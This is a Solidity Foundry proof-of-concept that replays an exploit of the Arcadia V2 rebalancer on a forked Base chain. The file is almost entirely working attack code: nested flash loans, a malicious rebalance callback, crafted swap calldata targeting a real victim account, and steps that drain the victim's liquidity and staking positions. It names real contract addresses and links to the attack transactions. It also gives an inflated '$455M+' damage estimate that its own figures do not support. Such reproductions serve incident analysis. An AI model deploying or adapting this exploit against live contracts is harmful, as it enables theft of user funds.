// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

// Arcadia V2 Protocol Exploit PoC - July 15, 2025
// This exploit targets the rebalancer vulnerability in Arcadia V2
// Attack vector: Rebalancer callback manipulation + Flash loan amplification
// Total estimated damage: ~$455M+ across multiple tokens

/**
    This Attack Flow is First Attack of Exploiter
    Victim Address: 0x9529e5988ced568898566782e88012cf11c3ec99
    Setup Tx: https://basescan.org/tx/0xeb1cbbe6cf195d7e23f2c967542b70031a220feacca010f5a35c0046d1a1820a
    Attack Tx: https://basescan.org/tx/0x06ce76eae6c12073df4aaf0b4231f951e4153a67f3abc1c1a547eb57d1218150 
    Another 20 Exploit Tx is also Exist: https://basescan.org/address/0x6250dfd35ca9eee5ea21b5837f6f21425bee4553
    Check Tx method is 0x60ba0ee3.

    If you want test other Exploit Tx, you should change the victim address and the value of inside onMorphoFlashLoan().
 */

interface IArcadiaV2 {
    // Creates new Arcadia account with specified parameters
    function createAccount(
        uint32 salt,
        uint256 accountVersion,
        address creditor
    ) external returns (address account);
}

// Uniswap V3 style exact input swap parameters
struct ExactInputSingleParams {
    address tokenIn;
    address tokenOut;
    int24 tickSpacing;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}

// Uniswap V3 style exact output swap parameters
struct ExactOutputSingleParams {
    address tokenIn;
    address tokenOut;
    int24 tickSpacing;
    address recipient;
    uint256 deadline;
    uint256 amountOut;
    uint256 amountInMaximum;
    uint160 sqrtPriceLimitX96;
}

interface ISwapRouter {
    // Execute exact input swap (sell exact amount of tokenIn)
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);

    // Execute exact output swap (buy exact amount of tokenOut)
    function exactOutputSingle(
        ExactOutputSingleParams calldata params
    ) external payable returns (uint256 amountIn);
}

interface IArcadiaAccount {
    // Grant/revoke asset manager privileges to external contracts
    function setAssetManager(address assetManager, bool value) external;

    // Deposit multiple assets into the account
    function deposit(
        address[] memory assets,
        uint256[] memory assetIds,
        uint256[] memory amounts
    ) external;

    // Get current asset holdings in the account
    function generateAssetData()
        external
        view
        returns (
            address[] memory assetAddresses,
            uint256[] memory assetIds,
            uint256[] memory assetAmounts
        );

    // Withdraw assets from the account
    function withdraw(
        address[] memory assets,
        uint256[] memory assetIds,
        uint256[] memory amounts
    ) external;
}

// CRITICAL VULNERABILITY: The rebalancer interface that enables the exploit
// The rebalancer calls back to the initiator's executeAction() during rebalancing
// This callback mechanism is exploited to manipulate account state
interface IRebalancer {
    // Configure account settings for rebalancing
    function setAccountInfo(
        address account_, // Target account to rebalance
        address initiator, // Contract that initiated rebalancing (this exploit contract)
        address hook // Hook contract address
    ) external;

    // Set rebalancing parameters - tolerance set to max to bypass safety checks
    function setInitiatorInfo(
        uint256 tolerance, // Price tolerance (set to 9999999999999999 to bypass)
        uint256 fee, // Rebalancing fee
        uint256 minLiquidityRatio // Minimum liquidity ratio
    ) external;

    // EXPLOIT ENTRY POINT: This function triggers the callback vulnerability
    function rebalance(
        address account_, // Account to rebalance
        address positionManager, // Position manager contract
        uint256 oldId, // Old position ID to close
        int24 tickLower, // New position lower tick
        int24 tickUpper, // New position upper tick
        bytes calldata swapData // Encoded swap instructions
    ) external;
}

interface ICLFactory {
    // Get concentrated liquidity pool address for token pair
    function getPool(address, address, int24) external returns (address pool);
}

// Parameters for minting new liquidity positions
struct MintParams {
    address token0; // First token in the pair
    address token1; // Second token in the pair
    int24 tickSpacing; // Tick spacing for the pool
    int24 tickLower; // Lower tick boundary
    int24 tickUpper; // Upper tick boundary
    uint256 amount0Desired; // Desired amount of token0
    uint256 amount1Desired; // Desired amount of token1
    uint256 amount0Min; // Minimum amount of token0
    uint256 amount1Min; // Minimum amount of token1
    address recipient; // Address to receive the position NFT
    uint256 deadline; // Transaction deadline
    uint160 sqrtPriceX96; // Square root price limit
}

// Parameters for decreasing liquidity from positions
struct DecreaseLiquidityParams {
    uint256 tokenId; // NFT token ID of the position
    uint128 liquidity; // Amount of liquidity to remove
    uint256 amount0Min; // Minimum amount of token0 to receive
    uint256 amount1Min; // Minimum amount of token1 to receive
    uint256 deadline; // Transaction deadline
}

// Parameters for collecting fees from positions
struct CollectParams {
    uint256 tokenId; // NFT token ID of the position
    address recipient; // Address to receive collected tokens
    uint128 amount0Max; // Maximum amount of token0 to collect
    uint128 amount1Max; // Maximum amount of token1 to collect
}

// Uniswap V3 style Non-Fungible Position Manager for liquidity positions
interface INonFungiblePositionManager {
    // Create new liquidity position and mint NFT
    function mint(
        MintParams calldata params
    )
        external
        returns (
            uint256 tokenId, // NFT token ID of new position
            uint128 liquidity, // Liquidity amount added
            uint256 amount0, // Actual amount of token0 used
            uint256 amount1 // Actual amount of token1 used
        );

    // Approve operator for all NFTs
    function setApprovalForAll(address operator, bool approved) external;

    // Approve specific NFT
    function approve(address to, uint256 tokenId) external;

    // Burn empty position NFT
    function burn(uint256 tokenId) external;

    // Remove liquidity from position
    function decreaseLiquidity(
        DecreaseLiquidityParams memory params
    ) external payable returns (uint256 amount0, uint256 amount1);

    // Collect fees and tokens from position
    function collect(
        CollectParams calldata params
    ) external payable returns (uint256 amount0, uint256 amount1);
}

interface ICPool {
    // Get current pool state information
    function slot0()
        external
        returns (
            uint160 sqrtPriceX96, // Current price in sqrt format
            int24 tick, // Current tick
            uint16 observationIndex, // Index of last written observation
            uint16 observationCardinality, // Number of observations
            uint16 observationCardinalityNext, // Next observation cardinality
            bool unlocked // Whether pool is unlocked for swaps
        );
}

interface IArcadiaLendingPool {
    // Get maximum withdrawable amount for an account
    function maxWithdraw(address owner) external returns (uint256);
    // Repay debt on behalf of another account
    function repay(uint256 amount, address account) external;
}

interface IStakeSlipsAM {
    // Burn staking position and claim rewards
    function burn(uint256 positionId) external returns (uint256 rewards);
}

// Main test contract - simulates the Arcadia V2 exploit from July 15, 2025
contract ArcadiaV2PoC is Test {
    IArcadiaV2 public arcadiaV2;
    ExploitContract public exploitContract;

    function setUp() public {
        // Fork Base chain at block just before the exploit
        vm.createSelectFork("base", 32881499 - 1);
        // Set timestamp to match exploit time: Jul-15-2025 04:05:45 AM +UTC
        vm.warp(1752552345);

        // Initialize Arcadia V2 contract (main protocol contract)
        arcadiaV2 = IArcadiaV2(0xDa14Fdd72345c4d2511357214c5B89A919768e59);
        exploitContract = new ExploitContract(address(arcadiaV2));
    }

    function testExploit() public {
        // Execute the complete exploit sequence
        exploitContract.setUp(); // Create 15 controlled accounts
        exploitContract.executeFlashLoan(
            0x9529E5988ceD568898566782e88012cf11C3Ec99
        ); // Initiate the multi-stage attack
        exploitContract.logDrainAsset(); // Log drained asset amounts
    }
}

// Main exploit contract - orchestrates the complex multi-phase attack
contract ExploitContract is Test {
    // Core protocol interfaces
    IArcadiaV2 public arcadiaV2;
    IERC20 public weth; // Wrapped Ether on Base
    IERC20 public cUSDC; // Circle USD Coin
    IERC20 public cbBTC; // Coinbase Bitcoin
    IMorphoBuleFlashLoan public morphoBuleFlashLoan; // Flash loan provider
    IRebalancer public rebalancer; // VULNERABLE: The main attack target
    ICLFactory public clFactory; // Concentrated liquidity factory
    INonFungiblePositionManager public nonFungiblePositionManager; // LP position manager
    IArcadiaLendingPool public arcadiaLendingPool; // cbBTC lending pool
    IArcadiaLendingPool public arcadiaLendingPool2; // cUSDC lending pool
    IStakeSlipsAM public stakeSlipsAM; // Staking rewards manager
    ISwapRouter public swapRouter; // DEX swap router
    IERC20 public aero;
    IERC20 public eurc;
    IERC20 public tBTC;

    // Attack state variables
    address[] public accounts = new address[](15); // Array of controlled accounts
    uint256 flashLoanCount = 0; // Tracks flash loan nesting level

    constructor(address _arcadiaV2) {
        // Initialize all contract addresses on Base chain
        arcadiaV2 = IArcadiaV2(_arcadiaV2);
        weth = IERC20(0x4200000000000000000000000000000000000006); // Base WETH
        cUSDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913); // Circle USDC
        morphoBuleFlashLoan = IMorphoBuleFlashLoan(
            0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb // Morpho Blue flash loan contract
        );
        cbBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf); // Coinbase BTC
        rebalancer = IRebalancer(0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509); // VULNERABLE CONTRACT
        clFactory = ICLFactory(0x5e7BB104d84c7CB9B682AaC2F3d509f5F406809A); // CL pool factory
        nonFungiblePositionManager = INonFungiblePositionManager(
            0x827922686190790b37229fd06084350E74485b72 // Position manager
        );
        arcadiaLendingPool = IArcadiaLendingPool(
            0xa37E9b4369dc20940009030BfbC2088F09645e3B // cbBTC lending pool
        );
        arcadiaLendingPool2 = IArcadiaLendingPool(
            0x3ec4a293Fb906DD2Cd440c20dECB250DeF141dF1 // cUSDC lending pool
        );
        stakeSlipsAM = IStakeSlipsAM(
            0x1Dc7A0f5336F52724B650E39174cfcbbEdD67bF1 // Staking manager
        );
        swapRouter = ISwapRouter(0xBE6D8f0d05cC4be24d5167a3eF062215bE6D18a5); // Swap router

        aero = IERC20(0x940181a94A35A4569E4529A3CDfB74e38FD98631); // Aero token

        eurc = IERC20(0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42); // EURC token

        tBTC = IERC20(0x236aa50979D5f3De3Bd1Eeb40E81137F22ab794b);
    }

    /// @notice PHASE 1: Account Setup - Creates 15 controlled Arcadia accounts
    /// @dev Creates accounts with sequential salts (0-14), all with version 1 and zero creditor
    /// @dev These accounts will be used to manipulate the protocol state
    /// @dev Setting creditor to zero address bypasses certain restrictions
    /// it might be trigger Arcadia's cool down period, allowing more freedom
    function setUp() external {
        address account;
        for (uint256 i = 0; i < 15; i++) {
            // Create account with predictable salt for later reference
            account = arcadiaV2.createAccount(
                uint32(i), // Sequential salt
                1, // Account version 1
                address(0x0000000000000000000000000000000000000000) // No creditor = more freedom
            );
            accounts[i] = account;
        }
    }

    /// @notice PHASE 2: Flash Loan Initiation - Starts the nested flash loan cascade
    /// @dev Borrows maximum available amounts from Morpho Blue to amplify attack capital
    function executeFlashLoan(address _victimAccount) external {
        // Grant maximum approvals to flash loan contract for all attack tokens
        cUSDC.approve(address(morphoBuleFlashLoan), type(uint256).max);
        weth.approve(address(morphoBuleFlashLoan), type(uint256).max);
        cbBTC.approve(address(morphoBuleFlashLoan), type(uint256).max);

        // Get entire USDC balance from Morpho Blue (~$150M+)
        uint256 morphoUSDCBalance = cUSDC.balanceOf(
            address(morphoBuleFlashLoan)
        );

        // Start flash loan cascade with victim account + rebalancer addresses in data
        morphoBuleFlashLoan.flashLoan(
            address(cUSDC),
            morphoUSDCBalance,
            abi.encode(_victimAccount)
        );
    }

    function logDrainAsset() external view {
        // Log the drained asset amounts after the exploit
        uint256 drainUSDC = cUSDC.balanceOf(address(this));
        uint256 drainWETH = weth.balanceOf(address(this));
        uint256 draincbBTC = cbBTC.balanceOf(address(this));
        uint256 drainAero = aero.balanceOf(address(this));
        uint256 drainEURC = eurc.balanceOf(address(this));
        uint256 draintBTC = tBTC.balanceOf(address(this));

        console.log(
            "Drained USDC: %s, WETH: %s, cbBTC: %s",
            drainUSDC, // Convert to USDC
            drainWETH, // Convert to WETH
            draincbBTC // Convert to cbBTC
        );

        console.log(
            "Drained Aero: %s, EURC: %s, tBTC: %s",
            drainAero,
            drainEURC,
            draintBTC
        );
    }

    // Standard ERC721 receiver for handling NFT transfers
    function onERC721Received(
        address msgSender,
        address from,
        uint256 id,
        bytes calldata
    ) external pure returns (bytes4) {
        console.log("ERC721 received id: ", id);
        console.log("From: %s, MsgSender: %s", from, msgSender);
        return this.onERC721Received.selector;
    }

    /// @notice CRITICAL VULNERABILITY: Rebalancer callback function
    /// @dev This function is called by the rebalancer during position rebalancing
    /// @dev The vulnerability allows transferring tokens BEFORE the actual rebalancing
    /// @dev This manipulates the account's apparent value for excessive withdrawals
    /// @return Empty arrays to satisfy the interface (assets, assetIds, assetAmounts, assetTypes)
    function executeAction(
        bytes calldata data
    )
        external
        returns (
            address[] memory,
            uint256[] memory,
            uint256[] memory,
            uint256[] memory
        )
    {
        // EXPLOIT: Transfer tokens to rebalancer before position is actually rebalanced
        // It make seems it was correct action
        cbBTC.transfer(address(rebalancer), 100000000); // 1 cbBTC
        cUSDC.transfer(address(rebalancer), 50000000000); // 50,000 USDC

        // Return empty arrays as required by interface
        address[] memory assets = new address[](0);
        uint256[] memory assetIds = new uint256[](0);
        uint256[] memory assetAmounts = new uint256[](0);
        uint256[] memory assetTypes = new uint256[](0);

        return (assets, assetIds, assetAmounts, assetTypes);
    }

    /// @notice PHASE 3: Flash Loan Callback - Orchestrates the nested flash loan attack
    /// @dev This function is called by Morpho Blue for each flash loan in the cascade
    /// @dev Uses flashLoanCount to track nesting level and execute different phases
    function onMorphoFlashLoan(uint256 amount, bytes calldata data) external {
        address victimAddress = abi.decode(data, (address));
        // PHASE 3A: First callback - Borrow all available WETH (~$150M+)
        if (flashLoanCount == 0) {
            uint256 morphoWETHBalance = weth.balanceOf(
                address(morphoBuleFlashLoan)
            );
            flashLoanCount++;
            bytes memory swapData1 = abi.encode(victimAddress);
            // Initiate second flash loan for WETH
            morphoBuleFlashLoan.flashLoan(
                address(weth),
                morphoWETHBalance,
                swapData1
            );
        }

        // PHASE 3B: Second callback - Borrow all available cbBTC (~$150M+)
        if (flashLoanCount == 1) {
            uint256 cbBTCBalance = cbBTC.balanceOf(
                address(morphoBuleFlashLoan)
            );
            flashLoanCount++;
            bytes memory swapData2 = abi.encode(victimAddress);
            // Initiate third flash loan for cbBTC
            morphoBuleFlashLoan.flashLoan(
                address(cbBTC),
                cbBTCBalance,
                swapData2
            );
        }

        // PHASE 3C: Third callback - Execute the main exploit with maximum capital
        if (flashLoanCount == 2) {
            IArcadiaAccount victimAccount = IArcadiaAccount(victimAddress);
            // STEP 1: Grant rebalancer control over our controlled account
            IArcadiaAccount(accounts[0]).setAssetManager(
                0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509, // Rebalancer address
                true // Grant permission
            );

            // STEP 2: Configure rebalancer with malicious parameters
            rebalancer.setAccountInfo(
                accounts[0], // Account to rebalance
                address(this), // THIS CONTRACT as initiator (enables callback)
                0xCD01715b785B18863D549973133C5bfEfd91995D // Hook contract
            );

            // STEP 3: Set rebalancer parameters to bypass safety checks
            rebalancer.setInitiatorInfo(
                9999999999999999, // MAX tolerance (bypasses price checks)
                0, // No fees
                980000000000000000 // 98% min liquidity ratio
            );

            // STEP 4: Prepare tokens for liquidity position creation
            cUSDC.approve(
                address(nonFungiblePositionManager),
                type(uint256).max
            );
            cbBTC.approve(
                address(nonFungiblePositionManager),
                type(uint256).max
            );

            // STEP 5: Create initial liquidity position (cUSDC/cbBTC pair)
            MintParams memory params = MintParams({
                token0: address(cUSDC), // cUSDC as token0
                token1: address(cbBTC), // cbBTC as token1
                tickSpacing: 100, // Standard tick spacing
                tickLower: -71100, // Initial tick range
                tickUpper: -70100, // Initial tick range
                amount0Desired: 1773463824, // ~1,773 USDC
                amount1Desired: 2832455, // ~0.028 cbBTC
                amount0Min: 0, // No minimum (risky but needed)
                amount1Min: 0, // No minimum (risky but needed)
                recipient: address(this), // This contract receives NFT
                deadline: 1752552345, // Exploit timestamp
                sqrtPriceX96: 0 // Current price
            });

            // Mint the position NFT (will be tokenId 19403401)
            // Mint the position NFT (will be tokenId 19403401)
            nonFungiblePositionManager.mint(params);

            // STEP 6: Grant Arcadia account permissions to manage tokens and NFTs
            cUSDC.approve(accounts[0], type(uint256).max);
            cbBTC.approve(accounts[0], type(uint256).max);
            nonFungiblePositionManager.setApprovalForAll(accounts[0], true);

            // STEP 7: Deposit assets into controlled Arcadia account
            address[] memory assets = new address[](3);
            assets[0] = address(nonFungiblePositionManager); // Position NFT
            assets[1] = address(cUSDC); // USDC tokens
            assets[2] = address(cbBTC); // cbBTC tokens

            uint256[] memory assetIds = new uint256[](3);
            assetIds[0] = 19403401; // PREDICTED: Position NFT token ID
            assetIds[1] = 0; // cUSDC (fungible token)
            assetIds[2] = 0; // cbBTC (fungible token)

            uint256[] memory amounts = new uint256[](3);
            amounts[0] = 1; // 1 NFT position
            amounts[1] = 10000000; // 10 USDC
            amounts[2] = 100000000; // 1 cbBTC

            IArcadiaAccount(accounts[0]).deposit(assets, assetIds, amounts);

            // STEP 8: Manipulate victim account state by checking withdrawal limits
            arcadiaLendingPool.maxWithdraw(address(victimAccount)); // cbBTC pool --> use by victim address
            arcadiaLendingPool2.maxWithdraw(address(victimAccount)); // cUSDC pool --> 0

            // STEP 9: Strategic debt repayment to improve victim's position
            cbBTC.approve(address(arcadiaLendingPool), 0);
            cbBTC.approve(address(arcadiaLendingPool), type(uint256).max);
            arcadiaLendingPool.repay(1443715344, address(victimAccount)); // repayment all debt

            // STEP 10: Re-check victim's new withdrawal capacity
            arcadiaLendingPool.maxWithdraw(address(victimAccount)); // cbBTC pool --> 0
            victimAccount.generateAssetData(); // Update asset state

            // STEP 11: Prepare complex swap data for rebalancer
            // This encoded data contains instructions for token swaps during rebalancing
            // it must contain victim address, malicious router address and malicious swap data(transfer LP position to address(this))
            // TODO: dynamically generate swap data based on current market conditions
            bytes memory swapData = abi.encodePacked(
                hex"0000000000000000000000009529e5988ced568898566782e88012cf11c3ec990000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000005e40b9252f00000000000000000000000005615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000058000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000003a000000000000000000000000000000000000000000000000000000000000004a0000000000000000000000000000000000000000000000000000000000000052000000000000000000000000000000000000000000000000000000000000005400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002600000000000000000000000000000000000000000000000000000000000000004000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000820c137fa70c8691f0e44dc420a5e53c168921dc000000000000000000000000940181a94a35a4569e4529a3cdfb74e38fd986310000000000000000000000001dc7a0f5336f52724b650e39174cfcbbedd67bf100000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001207cb8000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000003ac64623400000000000000000000000000000000000000000000002c8c43ee26ec432953000000000000000000000000000000000000000000000034494df3a0122fc9d1000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c729213b9b72694f202feb9cf40fe8ba5f5a450900000000000000000000000000000000000000000000000000000000"
            );

            // STEP 12: *** CRITICAL EXPLOIT TRIGGER ***
            // This rebalance call triggers the executeAction() callback vulnerability
            // During this call, our executeAction() function transfers tokens to rebalancer
            // BEFORE the actual position rebalancing, creating accounting discrepancy
            rebalancer.rebalance(
                accounts[0], // Our controlled account
                0x827922686190790b37229fd06084350E74485b72, // Position manager address(not malicious)
                19403401, // Old position ID (to close)
                -81100, // New tick lower (different range)
                -80100, // New tick upper (different range)
                swapData // Complex swap instructions
            );
            // RESULT: Creates new position with ID 19403402 while inflating account value

            // STEP 13: Clean up approvals and check account state
            weth.approve(0x0000000000000000000000000000000000000000, 0);
            IArcadiaAccount(accounts[0]).generateAssetData(); // Verify inflated balance

            // STEP 14: *** EXPLOIT DRAIN PHASE ***
            // Withdraw massive amounts due to inflated account value from callback manipulation
            assets[0] = address(cUSDC);
            assets[1] = address(cbBTC);
            assets[2] = address(nonFungiblePositionManager);

            assetIds[0] = 0; // cUSDC (fungible token)
            assetIds[1] = 0; // cbBTC (fungible token)
            assetIds[2] = 19403402; // NEW position ID (oldId + 1)

            // MASSIVE WITHDRAWALS: Far exceeding what was deposited due to accounting manipulation
            amounts[0] = 51783463823; // 51,783 USDC (vs 10 deposited!)
            amounts[1] = 100000000; // 1 cbBTC (same as deposited)
            amounts[2] = 1; // 1 NFT position

            IArcadiaAccount(accounts[0]).withdraw(assets, assetIds, amounts);

            // STEP 15: Liquidate the new position to extract remaining value
            nonFungiblePositionManager.decreaseLiquidity(
                DecreaseLiquidityParams({
                    tokenId: 19403402, // New position from rebalance
                    liquidity: 113886156850, // Remove all liquidity
                    amount0Min: 0, // No minimum protection
                    amount1Min: 0, // No minimum protection
                    deadline: 1752552345 // Exploit timestamp
                })
            );

            // STEP 16: Collect all fees and remaining tokens from the position
            // STEP 16: Collect all fees and remaining tokens from the position
            nonFungiblePositionManager.collect(
                CollectParams({
                    tokenId: 19403402, // New position from rebalance
                    recipient: address(this), // Send tokens to this contract
                    amount0Max: 340282366920938463463374607431768211455, // Max uint128 for token0
                    amount1Max: 340282366920938463463374607431768211455 // Max uint128 for token1
                })
            );

            // STEP 17: Extract rewards from victim's staking position
            stakeSlipsAM.burn(18906296); // Burn victim's staking position for rewards

            // STEP 18: Liquidate the victim's remaining position
            nonFungiblePositionManager.decreaseLiquidity(
                DecreaseLiquidityParams({
                    tokenId: 18906296, // Victim's position ID
                    liquidity: 50021236746390051253539, // Remove massive liquidity amount
                    amount0Min: 0, // No slippage protection
                    amount1Min: 0, // No slippage protection
                    deadline: 1752552345 // Exploit timestamp
                })
            );

            // STEP 19: Collect all remaining tokens from victim's position
            nonFungiblePositionManager.collect(
                CollectParams({
                    tokenId: 18906296, // Victim's position ID
                    recipient: address(this), // Send all tokens to attacker
                    amount0Max: 340282366920938463463374607431768211455, // Max collection
                    amount1Max: 340282366920938463463374607431768211455 // Max collection
                })
            );

            // STEP 20: Convert accumulated USDC to WETH for better liquidity
            cUSDC.approve(address(swapRouter), type(uint256).max);
            swapRouter.exactInputSingle(
                ExactInputSingleParams({
                    tokenIn: address(cUSDC), // Sell USDC
                    tokenOut: address(weth), // Buy WETH
                    tickSpacing: 100, // Standard tick spacing
                    recipient: address(this), // Receive WETH
                    deadline: 1752552345, // Exploit timestamp
                    amountIn: 2289695390055, // Massive USDC amount (~$2.28M)
                    amountOutMinimum: 0, // No slippage protection (risky)
                    sqrtPriceLimitX96: 0 // No price limit
                })
            );

            weth.approve(address(swapRouter), type(uint256).max);

            swapRouter.exactOutputSingle(
                ExactOutputSingleParams({
                    tokenIn: address(weth),
                    tokenOut: address(cbBTC),
                    tickSpacing: 100,
                    recipient: address(this),
                    deadline: 1752552345,
                    amountOut: 1443715346,
                    amountInMaximum: 6399049343244535861498,
                    sqrtPriceLimitX96: 0
                })
            );

            flashLoanCount++;
        }
    }
}
